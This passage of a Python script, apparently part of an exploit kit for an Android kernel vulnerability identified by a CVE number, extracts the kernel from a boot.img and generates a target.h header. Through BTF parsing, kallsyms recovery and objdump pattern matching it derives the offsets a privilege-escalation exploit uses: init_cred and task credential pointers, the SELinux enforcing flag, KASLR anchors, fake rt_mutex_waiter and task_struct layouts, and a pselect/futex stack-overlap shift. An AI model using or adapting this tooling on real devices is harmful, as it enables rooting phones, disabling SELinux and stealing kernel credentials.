        typ = BTFType(
            type_id=type_id,
            name=_btf_cstr(strings, name_off),
            kind=kind,
            size_type=size_type,
            vlen=vlen,
            kflag=kflag,
        )
        if kind in {"STRUCT", "UNION"}:
            need = 12 * vlen
            if p + need > type_end:
                fail("BTF struct/union members 截断")
            for _ in range(vlen):
                member_name_off, member_type, raw = struct.unpack_from("<III", data, p)
                p += 12
                bit_size = raw >> 24 if kflag else 0
                bit_offset = raw & 0xFFFFFF if kflag else raw
                typ.members.append(
                    BTFMember(
                        _btf_cstr(strings, member_name_off),
                        member_type,
                        bit_offset,
                        bit_size,
                    )
                )
        elif kind == "ARRAY":
            if p + 12 > type_end:
                fail("BTF array 截断")
            typ.array = struct.unpack_from("<III", data, p)
            p += 12
        elif kind == "INT":
            if p + 4 > type_end:
                fail("BTF INT 载荷截断")
            typ.int_encoding = u32(data, p)
            p += 4
        elif kind == "ENUM":
            need = 8 * vlen
            if p + need > type_end:
                fail("BTF ENUM 载荷截断")
            for _ in range(vlen):
                enum_name_off, raw_value = struct.unpack_from("<II", data, p)
                p += 8
                value = struct.unpack("<i", struct.pack("<I", raw_value))[0] if kflag else raw_value
                typ.enum_values.append((_btf_cstr(strings, enum_name_off), value))
        elif kind == "FUNC_PROTO":
            need = 8 * vlen
            if p + need > type_end:
                fail("BTF FUNC_PROTO 参数截断")
            for _ in range(vlen):
                param_name_off, param_type = struct.unpack_from("<II", data, p)
                p += 8
                typ.params.append((_btf_cstr(strings, param_name_off), param_type))
        elif kind == "VAR":
            if p + 4 > type_end:
                fail("BTF VAR 载荷截断")
            typ.var_linkage = u32(data, p)
            p += 4
        elif kind == "DATASEC":
            need = 12 * vlen
            if p + need > type_end:
                fail("BTF DATASEC 截断")
            for _ in range(vlen):
                typ.datasec.append(struct.unpack_from("<III", data, p))
                p += 12
        elif kind == "DECL_TAG":
            if p + 4 > type_end:
                fail("BTF DECL_TAG 载荷截断")
            typ.component_idx = struct.unpack_from("<i", data, p)[0]
            p += 4
        elif kind == "ENUM64":
            need = 12 * vlen
            if p + need > type_end:
                fail("BTF ENUM64 载荷截断")
            for _ in range(vlen):
                enum_name_off, low, high = struct.unpack_from("<III", data, p)
                p += 12
                value = low | (high << 32)
                if kflag and high & 0x80000000:
                    value -= 1 << 64
                typ.enum_values.append((_btf_cstr(strings, enum_name_off), value))
        elif kind in {
            "PTR", "FWD", "TYPEDEF", "VOLATILE", "CONST", "RESTRICT",
            "FUNC", "FLOAT", "TYPE_TAG",
        }:
            pass
        if p > type_end:
            fail(f"BTF type_id={type_id} 载荷越界")
        types.append(typ)
    if p != type_end:
        fail("BTF type 区未精确消费")
    max_id = len(types) - 1

    def check_ref(type_id: int, where: str, allow_zero: bool) -> None:
        if type_id == 0 and allow_zero:
            return
        if not (1 <= type_id <= max_id):
            fail(f"BTF {where} 引用越界 type_id={type_id}")

    for typ in types[1:]:
        assert typ is not None
        where = f"type_id={typ.type_id}/{typ.kind}"
        if typ.kind == "PTR":
            check_ref(typ.size_type, where, True)
        elif typ.kind in {"TYPEDEF", "VOLATILE", "CONST", "RESTRICT", "TYPE_TAG"}:
            check_ref(typ.size_type, where, True)
        elif typ.kind in {"FUNC", "VAR", "DECL_TAG"}:
            check_ref(typ.size_type, where, False)
        elif typ.kind == "FUNC_PROTO":
            check_ref(typ.size_type, where + "/return", True)
            for index, (name, param_type) in enumerate(typ.params):
                if param_type == 0 and (name != "" or index != len(typ.params) - 1):
                    fail(f"BTF {where} 非末尾/具名参数非法引用 void")
                check_ref(
                    param_type, where + f"/param[{index}]",
                    name == "" and index == len(typ.params) - 1,
                )
        elif typ.kind in {"STRUCT", "UNION"}:
            for member in typ.members:
                check_ref(member.type_id, where + f"/{member.name}", False)
        elif typ.kind == "ARRAY" and typ.array:
            check_ref(typ.array[0], where + "/element", False)
            check_ref(typ.array[1], where + "/index", False)
        elif typ.kind == "DATASEC":
            for var_type, _, _ in typ.datasec:
                check_ref(var_type, where + "/var", False)
                target = types[var_type]
                if target is None or target.kind != "VAR":
                    fail(f"BTF {where} DATASEC 条目不引用 VAR")
    return BTFInfo(off, max(type_end, str_end), type_len, str_len, types)


def locate_btf(data: bytes, kallsyms: KallsymsInfo) -> BTFInfo:
    candidates: list[BTFInfo] = []
    pos = 0
    magic = b"\x9f\xeb\x01\x00"
    while True:
        pos = data.find(magic, pos)
        if pos < 0:
            break
        try:
            parsed = parse_btf_at(data, pos)
        except GenerationError:
            pos += 1
            continue
        if parsed.type_len > 0x1000 and parsed.str_len > 0x1000:
            candidates.append(parsed)
        pos += 1
    if len(candidates) != 1:
        fail(
            "有效 vmlinux BTF 候选不唯一: "
            + repr([(hex(c.offset), c.type_len, c.str_len) for c in candidates])
        )
    result = candidates[0]
    start = kallsyms.one("__start_BTF")
    stop = kallsyms.one("__stop_BTF")
    if result.offset != start or result.end != stop:
        fail(
            "BTF blob 未与 kallsyms __start_BTF/__stop_BTF 闭合: "
            f"parsed=[0x{result.offset:x},0x{result.end:x}), "
            f"symbols=[0x{start:x},0x{stop:x})"
        )
    return result


def validate_btf_consumer_layout(btf: BTFInfo) -> None:
    """Validate widths/contiguity required by the exploit consumer."""

    def require_size(struct_name: str, field_name: str, expected: int) -> None:
        actual = btf.direct_field_size(struct_name, field_name)
        if actual != expected:
            fail(
                f"消费端字段宽度不兼容: {struct_name}.{field_name} "
                f"size={actual}, expected={expected}"
            )

    require_size("selinux_state", "enforcing", 1)
    for name, expected in (("real_cred", 8), ("cred", 8)):
        require_size("task_struct", name, expected)
    for name in ("uclamp_req", "uclamp"):
        require_size("task_struct", name, 8)
    for name in ("task", "lock", "ww_ctx"):
        require_size("rt_mutex_waiter", name, 8)
    require_size("rt_mutex_waiter", "wake_state", 4)
    require_size("rt_waiter_node", "prio", 4)
    require_size("rt_waiter_node", "deadline", 8)


PROFILE_FIELDS = {
    "p0_phys_offset",
    "p0_kernel_phys_load",
}
PSELECT_ROUTE_NFDS = 320


def load_profile(path: Path) -> dict[str, Any]:
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise GenerationError(f"profile JSON 读取失败: {exc}") from exc
    if not isinstance(raw, dict):
        fail("profile JSON 顶层必须是对象")
    missing = sorted(PROFILE_FIELDS - set(raw))
    unknown = sorted(set(raw) - PROFILE_FIELDS)
    if missing or unknown:
        fail(f"profile 必须且只能包含两个字段: missing={missing}, unknown={unknown}")

    profile = {
        "p0_phys_offset": parse_int(raw["p0_phys_offset"], "p0_phys_offset"),
        "p0_kernel_phys_load": parse_int(raw["p0_kernel_phys_load"], "p0_kernel_phys_load"),
    }
    return profile


def complete_profile(
    profile: dict[str, Any],
    config: dict[str, str],
    image_size: int,
) -> dict[str, Any]:
    va_bits = int(config["CONFIG_ARM64_VA_BITS"], 0)
    page_offset = ((1 << 64) - (1 << va_bits)) & ((1 << 64) - 1)
    pa_bits = int(config["CONFIG_ARM64_PA_BITS"], 0)
    max_phys = 1 << pa_bits
    if profile["p0_phys_offset"] & 0xfff or profile["p0_kernel_phys_load"] & 0xfff:
        fail("两个物理地址必须 4K 对齐")
    if profile["p0_kernel_phys_load"] < profile["p0_phys_offset"]:
        fail("p0_kernel_phys_load 小于 p0_phys_offset")
    if profile["p0_kernel_phys_load"] + image_size > max_phys:
        fail("kernel Image 超出物理地址位宽")
    return {**profile, "p0_page_offset": page_offset}


def run_objdump(
    tool: str,
    kernel_path: Path,
    start: int,
    stop: int,
) -> str:
    executable = shutil.which(tool) if os.sep not in tool else tool
    if not executable or not Path(executable).exists():
        fail(f"找不到 llvm-objdump: {tool}")
    if stop <= start or stop - start > 0x20000:
        fail(f"反汇编范围非法: 0x{start:x}..0x{stop:x}")
    proc = subprocess.run(
        [
            str(executable), "-d", "--triple=aarch64",
            f"--start-address=0x{start:x}", f"--stop-address=0x{stop:x}",
            str(kernel_path),
        ],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    if proc.returncode != 0:
        fail(f"llvm-objdump 失败: {proc.stderr.strip()}")
    if "Disassembly of section" not in proc.stdout:
        fail("llvm-objdump 未产生有效反汇编")
    return proc.stdout


def symbol_stop(kallsyms: KallsymsInfo, start: int, cap: int) -> int:
    higher = sorted({off for _, _, _, off in kallsyms.symbols if off > start})
    return min(start + cap, higher[0] if higher else start + cap)


def disassemble_symbol(
    tool: str,
    kernel_path: Path,
    kallsyms: KallsymsInfo,
    name: str,
    cap: int,
) -> str:
    start = kallsyms.one(name)
    return run_objdump(tool, kernel_path, start, symbol_stop(kallsyms, start, cap))


def first_sp_frame(text: str, name: str) -> int:
    matches = re.findall(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
    if not matches:
        # 也接受 pre-index stp 的小栈帧，但本 pselect/futex 路线应为显式 sub。
        fail(f"{name} 未找到 sub sp,sp,#imm 栈帧")
    return int(matches[0], 16)


def has_direct_call(text: str, target: int) -> bool:
    return bool(re.search(rf"\bbl\s+0x{target:x}\b", text, re.I))


def validate_frame_live_at(text: str, anchor: str, name: str) -> None:
    """Prove the first explicit frame allocation is still live at one anchor."""
    lines = text.splitlines()
    anchors = [index for index, line in enumerate(lines) if re.search(anchor, line, re.I)]
    if len(anchors) != 1:
        fail(f"{name} 栈帧 anchor 候选不唯一: {len(anchors)}")
    anchor_index = anchors[0]
    subs = [
        index for index, line in enumerate(lines[:anchor_index])
        if re.search(r"\bsub\s+sp,\s*sp,\s*#0x[0-9a-f]+", line, re.I)
    ]
    if len(subs) != 1:
        fail(f"{name} 在 anchor 前的显式 SP frame 数不是 1")
    for line in lines[subs[0] + 1:anchor_index]:
        if re.search(r"\b(?:add|sub)\s+sp,\s*sp,", line, re.I):
            fail(f"{name} 在 anchor 前再次调整 SP")
        if re.search(r"\[[ ]*sp\],\s*#0x[0-9a-f]+", line, re.I):
            fail(f"{name} 在 anchor 前出现 SP post-index 恢复")


def derive_pselect_layout(
    objdump: str,
    kernel_path: Path,
    kallsyms: KallsymsInfo,
    btf: BTFInfo,
    route_nfds: int,
) -> tuple[dict[str, int], dict[str, str]]:
    names = {
        "pselect_wrapper": "__arm64_sys_pselect6",
        # Linux/GKI 不同版本这里可能是：
        #   __arm64_sys_pselect6 -> core_sys_select
        # 或：
        #   __arm64_sys_pselect6 -> do_pselect -> core_sys_select
        # 原脚本只接受第一种，遇到第二种会误报失败。
        "pselect_core": "core_sys_select",
        "futex_wrapper": "__arm64_sys_futex",
        "futex_dispatch": "do_futex",
        "futex_wait": "futex_wait_requeue_pi",
    }
    if kallsyms.offsets_for("do_pselect"):
        names["pselect_dispatch"] = "do_pselect"

    dis = {
        key: disassemble_symbol(objdump, kernel_path, kallsyms, name, 0x2000)
        for key, name in names.items()
    }

    pselect_chain = ["pselect_wrapper"]
    pselect_core_addr = kallsyms.one(names["pselect_core"])
    if has_direct_call(dis["pselect_wrapper"], pselect_core_addr):
        # 老版本/部分配置：wrapper 直接调用 core_sys_select。
        pass
    elif "pselect_dispatch" in names and has_direct_call(
        dis["pselect_wrapper"], kallsyms.one(names["pselect_dispatch"])
    ):
        # Linux 6.6/GKI 常见：wrapper 先进入 do_pselect，再由 do_pselect 调 core_sys_select。
        if not has_direct_call(dis["pselect_dispatch"], pselect_core_addr):
            fail("do_pselect 未直接调用 core_sys_select")
        pselect_chain.append("pselect_dispatch")
    else:
        fail("__arm64_sys_pselect6 未直接调用 core_sys_select 或 do_pselect")
    pselect_chain.append("pselect_core")

    if not has_direct_call(dis["futex_wrapper"], kallsyms.one(names["futex_dispatch"])):
        fail("__arm64_sys_futex 未直接调用 do_futex")
    if not has_direct_call(dis["futex_dispatch"], kallsyms.one(names["futex_wait"])):
        fail("do_futex 未直接调用 futex_wait_requeue_pi")

    # 校验 pselect 调用链中每一跳的栈帧在调用点仍然有效。
    for caller_key, callee_key in zip(pselect_chain, pselect_chain[1:]):
        validate_frame_live_at(
            dis[caller_key],
            rf"\bbl\s+0x{kallsyms.one(names[callee_key]):x}\b",
            names[caller_key],
        )
    validate_frame_live_at(
        dis["futex_wrapper"],
        rf"\bbl\s+0x{kallsyms.one(names['futex_dispatch']):x}\b",
        names["futex_wrapper"],
    )
    validate_frame_live_at(
        dis["futex_dispatch"],
        rf"\bbl\s+0x{kallsyms.one(names['futex_wait']):x}\b",
        names["futex_dispatch"],
    )
    frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}
    pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
    waiter_candidates: list[tuple[str, int]] = []
    for reg, imm_text in re.findall(
        r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
    ):
        imm = int(imm_text, 16)
        if re.search(
            rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
            dis["futex_wait"], re.I,
        ):
            waiter_candidates.append((reg.lower(), imm))
    waiter_candidates = list(dict.fromkeys(waiter_candidates))
    if len(waiter_candidates) != 1:
        fail(f"futex waiter 栈局部候选不唯一: {waiter_candidates}")
    waiter_reg, waiter_local = waiter_candidates[0]
    validate_frame_live_at(
        dis["futex_wait"],
        rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
        names["futex_wait"],
    )
    wake_off = btf.field("rt_mutex_waiter", "wake_state")
    for required in (waiter_local, waiter_local + wake_off):
        if not re.search(rf"\[sp,\s*#0x{required:x}\]", dis["futex_wait"], re.I):
            fail("futex waiter 候选未被真实字段 store 交叉验证")
    add_sp: list[tuple[str, int]] = [
        (reg.lower(), int(imm, 16))
        for reg, imm in re.findall(
            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["pselect_core"], re.I
        )
    ]
    buffer_candidates: set[int] = set()
    for reg, imm in add_sp:
        if not re.search(rf"\bmov\s+{re.escape(reg)},\s*x0\b", dis["pselect_core"], re.I):
            continue
        peers = {peer for peer, peer_imm in add_sp if peer_imm == imm and peer != reg}
        if any(
            re.search(rf"\bcmp\s+{re.escape(reg)},\s*{re.escape(peer)}\b", dis["pselect_core"], re.I)
            or re.search(rf"\bcmp\s+{re.escape(peer)},\s*{re.escape(reg)}\b", dis["pselect_core"], re.I)
            for peer in peers
        ):
            buffer_candidates.add(imm)
    if len(buffer_candidates) != 1:
        fail(f"core_sys_select 栈 fdset buffer 候选不唯一: {sorted(buffer_candidates)}")
    pselect_buffer = next(iter(buffer_candidates))
    buffer_regs = sorted({
        reg for reg, imm in add_sp
        if imm == pselect_buffer
        and re.search(rf"\bmov\s+{re.escape(reg)},\s*x0\b", dis["pselect_core"], re.I)
    })
    if not buffer_regs:
        fail("core_sys_select 栈 buffer 没有输出寄存器")
    for buffer_reg in buffer_regs:
        validate_frame_live_at(
            dis["pselect_core"],
            rf"\badd\s+{re.escape(buffer_reg)},\s*sp,\s*#0x{pselect_buffer:x}\b",
            f"{names['pselect_core']}/{buffer_reg}",
        )
    fds_bytes = ((route_nfds + 63) // 64) * 8
    threshold_matches = [
        int(x, 16)
        for x in re.findall(r"\bcmp\s+x\d+,\s*#0x([0-9a-f]+)", dis["pselect_core"], re.I)
    ]
    if not any(fds_bytes < threshold <= fds_bytes + 8 for threshold in threshold_matches):
        fail("core_sys_select 未证明 profile nfds 走当前栈 fdset 路线")
    pselect_word0 = -sum(frames[key] for key in pselect_chain) + pselect_buffer
    futex_waiter = (
        -frames["futex_wrapper"]
        - frames["futex_dispatch"]
        - frames["futex_wait"]
        + waiter_local
    )
    delta = futex_waiter - pselect_word0
    if delta < 0 or delta % 8:
        fail(f"pselect/futex 栈重叠差不是非负 qword: {delta}")
    shift = delta // 8
    if shift > 16:
        fail(f"PSELECT_WAITER_WORD_SHIFT 异常过大: {shift}")
    result = {
        "PSELECT_WAITER_WORD_SHIFT": shift,
        "WAITER_LOCAL_OFF": waiter_local,
        "pselect_word0_relative": pselect_word0,
        "futex_waiter_relative": futex_waiter,
        "pselect_buffer_off": pselect_buffer,
        "pselect_route_nfds": route_nfds,
        "fds_bytes": fds_bytes,
        **{f"frame_{key}": value for key, value in frames.items()},
    }
    return result, dis


def _materialized_address(text: str, register: str, address: int) -> bool:
    lines = text.splitlines()
    page = address & ~0xFFF
    page_off = address & 0xFFF
    for index, line in enumerate(lines):
        if not re.search(rf"\badrp\s+{register},\s*0x{page:x}\b", line, re.I):
            continue
        nearby = "\n".join(lines[index + 1:index + 4])
        if re.search(
            rf"\badd\s+{register},\s*{register},\s*#0x{page_off:x}\b",
            nearby, re.I,
        ):
            return True
    return False


def derive_nf_logger_registration(
    objdump: str,
    kernel_path: Path,
    kernel: bytes,
    kallsyms: KallsymsInfo,
    btf: BTFInfo,
) -> tuple[dict[str, int], dict[str, str]]:
    register_text = disassemble_symbol(
        objdump, kernel_path, kallsyms, "nf_log_register", 0x800
    )
    init_text = disassemble_symbol(
        objdump, kernel_path, kallsyms, "nfnetlink_log_init", 0x800
    )
    logger = kallsyms.one("nfulnl_logger")
    loggers = kallsyms.one("loggers")
    type_off = btf.field("nf_logger", "type")
    if btf.direct_field_size("nf_logger", "type") != 4:
        fail("nf_logger.type 不是 4 字节 enum")
    logger_type = u32(kernel, logger + type_off)
    ulog_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
    max_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
    nfproto_unspec = btf.unique_enum_member_value("NFPROTO_UNSPEC")
    if logger_type != ulog_value or not (0 <= ulog_value < max_value):
        fail(
            "nfulnl_logger.type 未与 BTF NF_LOG_TYPE_ULOG 闭合: "
            f"data={logger_type}, enum={ulog_value}, max={max_value}"
        )
    logger_aliases = set(re.findall(r"\bmov\s+(x\d+),\s*x1\b", register_text, re.I))
    if len(logger_aliases) != 1:
        fail("nf_log_register 的 logger 参数别名不唯一")
    logger_reg = next(iter(logger_aliases)).lower()
    type_loads = set(re.findall(
        rf"\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]",
        register_text, re.I,
    ))
    if len(type_loads) != 1:
        fail("nf_log_register 未从 BTF nf_logger.type 唯一取索引")
    type_reg = next(iter(type_loads))
    base_regs = {
        match.group(1).lower()
        for match in re.finditer(r"\badrp\s+(x\d+),", register_text, re.I)
        if _materialized_address(register_text, match.group(1).lower(), loggers)
    }
    indexed: list[tuple[str, str]] = []
    for base_reg in base_regs:
        for destination, pf_reg in re.findall(
            rf"\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4",
            register_text, re.I,
        ):
            if re.search(
                rf"\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3",
                register_text, re.I,
            ):
                indexed.append((destination.lower(), pf_reg.lower()))
    indexed = list(dict.fromkeys(indexed))
    if len(indexed) != 1:
        fail(f"nf_log_register 的 loggers[pf][type] 索引数据流不唯一: {indexed}")
    slot_reg, _ = indexed[0]
    if not re.search(
        rf"\bstlr\s+{logger_reg},\s*\[{slot_reg}\]", register_text, re.I
    ):
        fail("nf_log_register 未把同一 logger 参数写入推导槽")
    if not re.search(rf"\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b", register_text, re.I):
        fail("nf_log_register 的 type 上界未与 BTF NF_LOG_TYPE_MAX 闭合")
    target = kallsyms.one("nf_log_register")
    calls = [
        index for index, line in enumerate(init_text.splitlines())
        if re.search(rf"\bbl\s+0x{target:x}\b", line, re.I)
    ]
    if len(calls) != 1:
        fail("nfnetlink_log_init -> nf_log_register 调用不唯一")
    init_lines = init_text.splitlines()
    call_window = "\n".join(init_lines[max(0, calls[0] - 6):calls[0]])
    if nfproto_unspec != 0 or not re.search(r"\bmov\s+w0,\s*wzr\b", call_window, re.I):
        fail("nfnetlink_log_init 未以 BTF NFPROTO_UNSPEC(0) 注册 logger")
    if not _materialized_address(init_text, "x1", logger):
        fail("nfnetlink_log_init x1 未物化 nfulnl_logger 地址")
    slot = loggers + ulog_value * 8  # pf=0，指针槽宽度由 arm64/BTF PTR=8 证明。
    return (
        {
            "loggers": loggers,
            "nfulnl_logger": logger,
            "nf_log_type_ulog": ulog_value,
            "nf_log_type_max": max_value,
            "slot": slot,
            "pf": nfproto_unspec,
            "pointer_size": 8,
        },
        {"nf_log_register": register_text, "nfnetlink_log_init": init_text},
    )


def locate_slide_objects(
    kernel: bytes,
    kallsyms: KallsymsInfo,
    btf: BTFInfo,
    logger_registration: dict[str, int],
) -> dict[str, int]:
    base = kallsyms.relative_base
    logger = kallsyms.one("nfulnl_logger")
    loggers = kallsyms.one("loggers")
    if logger_registration["loggers"] != loggers or logger_registration["nfulnl_logger"] != logger:
        fail("logger registration 语义结果与 kallsyms 对象不闭合")
    loggers_0_1 = logger_registration["slot"]
    sysctl_bootid = kallsyms.one("sysctl_bootid")
    data_field = btf.field("ctl_table", "data")
    procname_field = btf.field("ctl_table", "procname")
    mode_field = btf.field("ctl_table", "mode")
    needle = struct.pack("<Q", base + sysctl_bootid)
    candidates: list[int] = []
    pos = 0
    while True:
        pos = kernel.find(needle, pos)
        if pos < 0:
            break
        entry = pos - data_field
        if entry >= 0 and entry + btf.size("ctl_table") <= len(kernel):
            proc_ptr = u64(kernel, entry + procname_field)
            if base <= proc_ptr < base + len(kernel):
                try:
                    procname = read_cstr(kernel, proc_ptr - base)
                except GenerationError:
                    procname = ""
                if procname == "boot_id" and u16(kernel, entry + mode_field) == 0o444:
                    candidates.append(pos)
        pos += 1
    candidates = sorted(set(candidates))
    if len(candidates) != 1:
        fail(f"random_table boot_id.data 候选不唯一: {[hex(x) for x in candidates]}")
    return {
        "SLIDE_NFULNL_LOGGER_OFF": logger,
        "SLIDE_LOGGERS_0_1_OFF": loggers_0_1,
        "SLIDE_RANDOM_BOOT_ID_DATA_OFF": candidates[0],
    }


class TargetHeader:
    def __init__(self) -> None:
        self.sections: list[tuple[str, list[tuple[str, str]]]] = []

    def section(self, title: str) -> None:
        self.sections.append((title, []))

    def add(self, name: str, value: str) -> None:
        if not self.sections:
            fail("内部错误：添加宏前没有 section")
        if any(name == old for _, items in self.sections for old, _ in items):
            fail(f"内部错误：重复宏 {name}")
        self.sections[-1][1].append((name, value))

    def number(self, name: str, value: int, suffix: str = "", decimal: bool = False) -> None:
        self.add(name, f"{value}{suffix}" if decimal else f"0x{value:x}{suffix}")

    def render(self) -> str:
        lines = [
            "/* Generated by generate_target.py; do not copy offsets by hand. */",
            "#ifndef TARGET_H",
            "#define TARGET_H",
            "",
        ]
        for index, (title, items) in enumerate(self.sections):
            lines.append(f"/* {title} */")
            lines.extend(f"#define {name} {value}" for name, value in items)
            if index + 1 < len(self.sections):
                lines.append("")
        lines.extend(["", "#endif", ""])
        return "\n".join(lines)


def build_header(
    profile: dict[str, Any],
    kallsyms: KallsymsInfo,
    btf: BTFInfo,
    pselect: dict[str, int],
    slides: dict[str, int],
) -> str:
    h = TargetHeader()
    base = kallsyms.relative_base

    def symbol(name: str) -> int:
        return kallsyms.one(name)

    def address(name: str, offset: int) -> None:
        h.number(name, base + offset, "ULL")

    h.section("target profile")
    h.number("KIMAGE_TEXT_BASE", base, "ULL")
    for macro, key in (
        ("P0_PAGE_OFFSET", "p0_page_offset"),
        ("P0_PHYS_OFFSET", "p0_phys_offset"),
        ("P0_KERNEL_PHYS_LOAD", "p0_kernel_phys_load"),
    ):
        h.number(macro, profile[key], "ULL")
    h.number("PSELECT_WAITER_WORD_SHIFT", pselect["PSELECT_WAITER_WORD_SHIFT"], decimal=True)

    h.section("kernel image addresses")
    for macro, name in (
        ("INIT_TASK", "init_task"),
        ("INIT_CRED", "init_cred"),
        ("ENTRY_TASK", "__entry_task"),
        ("PER_CPU_OFFSET", "__per_cpu_offset"),
        ("ROOT_TASK_GROUP", "root_task_group"),
    ):
        address(macro, symbol(name))
    address(
        "SELINUX_ENFORCING",
        symbol("selinux_state") + btf.field("selinux_state", "enforcing"),
    )

    h.section("KASLR anchors")
    for macro, key in (
        ("SLIDE_NFULNL_LOGGER_IMAGE", "SLIDE_NFULNL_LOGGER_OFF"),
        ("SLIDE_LOGGERS_0_1_IMAGE", "SLIDE_LOGGERS_0_1_OFF"),
        ("SLIDE_RANDOM_BOOT_ID_DATA_IMAGE", "SLIDE_RANDOM_BOOT_ID_DATA_OFF"),
    ):
        address(macro, slides[key])
    address("SLIDE_INIT_TASK_IMAGE", symbol("init_task"))
    address("SLIDE_ROOT_TASK_GROUP_IMAGE", symbol("root_task_group"))

    h.section("waiter and fake task fields")
    waiter_fields = {
        "WAITER_TREE_ENTRY_OFF": btf.field("rt_mutex_waiter", "tree"),
        "WAITER_PI_TREE_ENTRY_OFF": btf.field("rt_mutex_waiter", "pi_tree"),
        "WAITER_TASK_OFF": btf.field("rt_mutex_waiter", "task"),
        "WAITER_LOCK_OFF": btf.field("rt_mutex_waiter", "lock"),
        "WAITER_WAKE_STATE_OFF": btf.field("rt_mutex_waiter", "wake_state"),
        "WAITER_PRIO_OFF": btf.field("rt_mutex_waiter", "tree") + btf.field("rt_waiter_node", "prio"),
        "WAITER_DEADLINE_OFF": btf.field("rt_mutex_waiter", "tree") + btf.field("rt_waiter_node", "deadline"),
        "WAITER_WW_CTX_OFF": btf.field("rt_mutex_waiter", "ww_ctx"),
    }
    for name, value in waiter_fields.items():
        h.number(name, value)
    fake_waiter = {
        "FAKE_WAITER_TREE_PRIO_OFF": waiter_fields["WAITER_PRIO_OFF"],
        "FAKE_WAITER_TREE_DEADLINE_OFF": waiter_fields["WAITER_DEADLINE_OFF"],
        "FAKE_WAITER_PI_TREE_ENTRY_OFF": waiter_fields["WAITER_PI_TREE_ENTRY_OFF"],
        "FAKE_WAITER_PI_TREE_PRIO_OFF": waiter_fields["WAITER_PI_TREE_ENTRY_OFF"] + btf.field("rt_waiter_node", "prio"),
        "FAKE_WAITER_PI_TREE_DEADLINE_OFF": waiter_fields["WAITER_PI_TREE_ENTRY_OFF"] + btf.field("rt_waiter_node", "deadline"),
        "FAKE_WAITER_TASK_OFF": waiter_fields["WAITER_TASK_OFF"],
        "FAKE_WAITER_LOCK_OFF": waiter_fields["WAITER_LOCK_OFF"],
        "FAKE_WAITER_WAKE_STATE_OFF": waiter_fields["WAITER_WAKE_STATE_OFF"],
        "FAKE_WAITER_WW_CTX_OFF": waiter_fields["WAITER_WW_CTX_OFF"],
    }
    for name, value in fake_waiter.items():
        h.number(name, value)
    for macro, field_name in (
        ("FAKE_TASK_USAGE_OFF", "usage"),
        ("FAKE_TASK_PRIO_OFF", "prio"),
        ("FAKE_TASK_NORMAL_PRIO_OFF", "normal_prio"),
        ("FAKE_TASK_TASK_GROUP_OFF", "sched_task_group"),
        ("FAKE_TASK_PI_LOCK_OFF", "pi_lock"),
        ("FAKE_TASK_PI_WAITERS_OFF", "pi_waiters"),
        ("FAKE_TASK_PI_TOP_TASK_OFF", "pi_top_task"),
        ("FAKE_TASK_PI_BLOCKED_ON_OFF", "pi_blocked_on"),
        ("FAKE_TASK_UCLAMP_REQ_OFF", "uclamp_req"),
        ("FAKE_TASK_UCLAMP_OFF", "uclamp"),
    ):
        h.number(macro, btf.field("task_struct", field_name))

    h.section("task credential pointers")
    for macro, field_name in (
        ("TASK_REAL_CRED_OFF", "real_cred"),
        ("TASK_CRED_OFF", "cred"),
    ):
        h.number(macro, btf.field("task_struct", field_name))
    return h.render()


def write_target(path: Path, header: str) -> None:
    path = path.resolve()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.parent.is_symlink() or not path.parent.is_dir():
        fail("--output 的父目录不是普通目录")
    if path.exists() and (path.is_symlink() or not path.is_file()):
        fail("--output 已存在且不是普通文件")
    fd, temporary = tempfile.mkstemp(prefix=f".{path.name}.", dir=path.parent)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as stream:
            stream.write(header)
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
    except Exception:
        try:
            os.unlink(temporary)
        except FileNotFoundError:
            pass
        raise


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="从 Android boot.img 生成 CVE-2026-43499 的精简 target.h",
    )
    parser.add_argument("--boot", type=Path, required=True, help="Android boot.img")
    parser.add_argument("--profile", type=Path, required=True, help="两字段 profile JSON")
    parser.add_argument("-o", dest="output", type=Path, required=True, help="输出 target.h")
    parser.add_argument("--llvm-objdump", default="llvm-objdump", help="llvm-objdump 命令")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = make_parser().parse_args(argv)
    try:
        if not args.boot.is_file() or args.boot.is_symlink():
            fail("--boot 必须是普通文件，拒绝符号链接")
        if args.output.resolve() == args.boot.resolve():
            fail("--output 不得覆盖 boot.img")

        boot = extract_boot_kernel(args.boot)
        _, config, _ = extract_ikconfig(boot.kernel)
        kallsyms = recover_kallsyms(boot.kernel, boot.kernel_size, boot.image_size)
        btf = locate_btf(boot.kernel, kallsyms)
        validate_btf_consumer_layout(btf)
        profile = complete_profile(load_profile(args.profile), config, boot.image_size)

        btf.validate_percpu_entry_task(
            kallsyms.one("__per_cpu_start"), kallsyms.one("__entry_task")
        )
        with tempfile.TemporaryDirectory(prefix="target-analysis-") as temporary:
            kernel_path = Path(temporary) / "kernel.bin"
            kernel_path.write_bytes(boot.kernel)
            pselect, _ = derive_pselect_layout(
                args.llvm_objdump,
                kernel_path,
                kallsyms,
                btf,
                PSELECT_ROUTE_NFDS,
            )
            logger_registration, _ = derive_nf_logger_registration(
                args.llvm_objdump, kernel_path, boot.kernel, kallsyms, btf
            )

        slides = locate_slide_objects(boot.kernel, kallsyms, btf, logger_registration)
        header = build_header(
            profile,
            kallsyms,
            btf,
            pselect,
            slides,
        )
        write_target(args.output, header)
        macro_count = len(re.findall(r"^#define ", header, re.M)) - 1
